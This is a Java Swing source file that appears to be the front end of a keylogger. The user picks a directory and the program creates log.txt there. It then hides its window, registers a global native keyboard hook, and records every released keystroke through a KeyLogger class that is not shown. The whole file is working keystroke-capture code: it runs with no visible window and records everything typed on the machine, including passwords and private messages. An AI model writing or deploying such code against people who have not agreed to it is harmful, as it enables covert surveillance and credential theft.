import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;

public class ChooseFileInterface extends JFrame implements NativeKeyListener {
    private JButton browseButton;
    private JButton submitButton;
    private JPanel panel;
    private JLabel selectedDirectoryLabel;
    private KeyLogger keyLogger;

    private String selectedDirectory;
    private File loggerFile;

    public ChooseFileInterface() {
        setUpWindow();
    }

    private void setUpWindow() {
        setWindowCharacteristics();
        addComponents();
    }

    private void setWindowCharacteristics() {
        setVisible(true);
        setResizable(true);
        setSize(500, 500);
        setUpPanel();
    }

    private void setUpPanel() {
        panel = new JPanel();
        panel.setSize(500, 500);
        panel.setVisible(true);
        add(panel);
    }


    private void addComponents() {
        assignButtons();
        setUpButtons();
        setUpSelecetedDirectoryLabel();
        panel.add(browseButton);
        panel.add(submitButton);
        panel.add(selectedDirectoryLabel);
    }

    private void assignButtons() {
        browseButton = new JButton();
        submitButton = new JButton();
    }

    private void setUpButtons() {
        setUpBrowseButton();
        setUpSubmitButton();
    }

    private void setUpBrowseButton() {
        browseButton = new JButton();
        browseButton.setVisible(true);
        browseButton.setSize(100, 100);
        browseButton.setText("Browse");

        browseButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                browseButtonPushed();
            }
        });
    }

    private void setUpSubmitButton() {
        submitButton = new JButton();
        submitButton.setVisible(true);
        submitButton.setSize(100, 100);
        submitButton.setText("Submit");
        submitButton.setEnabled(false);

        submitButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                submitButtonPushed();
            }
        });
    }

    private void setUpSelecetedDirectoryLabel() {
        selectedDirectoryLabel = new JLabel();
        selectedDirectoryLabel.setVisible(true);
        selectedDirectoryLabel.setSize(100, 100);
        selectedDirectoryLabel.setText("No directory selected.");
    }

    private void browseButtonPushed() {
        selectedDirectory = getSelectedDirectory();
        System.out.println(selectedDirectory);
        if(selectedDirectory != null) {
            submitButton.setEnabled(true);
            selectedDirectoryLabel.setText(selectedDirectory);
        }
    }

    private String getSelectedDirectory() {
        JFileChooser fileChooser = new JFileChooser();
        fileChooser.setFileSelectionMode(JFileChooser.DIRECTORIES_ONLY);
        fileChooser.showOpenDialog(null);
        File directoryPath = fileChooser.getSelectedFile();

        return (directoryPath.getAbsolutePath());
    }


    private void submitButtonPushed() {
        addFileExtensionToDirectory();
        createLoggerFile(selectedDirectory);
        hideWindow();
        beginKeyLogger();
    }

    private void addFileExtensionToDirectory() {
        final String FILE_NAME = "/log.txt";
        selectedDirectory += FILE_NAME;
    }

    private void createLoggerFile(String selectedDirectory) {
        loggerFile = new File(selectedDirectory);
        try {
            if(!loggerFile.exists()) {
                loggerFile.createNewFile();
            }
        }catch (IOException e) {
            System.out.println(e);
        }
    }

    private void hideWindow() {
        setVisible(false);
    }

    private void beginKeyLogger() {
        keyLogger = new KeyLogger(loggerFile);
        try {
            GlobalScreen.registerNativeHook();
        }catch (NativeHookException e) {
            System.out.println(e);
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    private boolean keyLoggerHasBeenActivated() {
        return (keyLogger != null);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        if (keyLoggerHasBeenActivated()) {
            String keystroke = NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode());
            keyLogger.logToFile(keystroke);
        }
    }
}
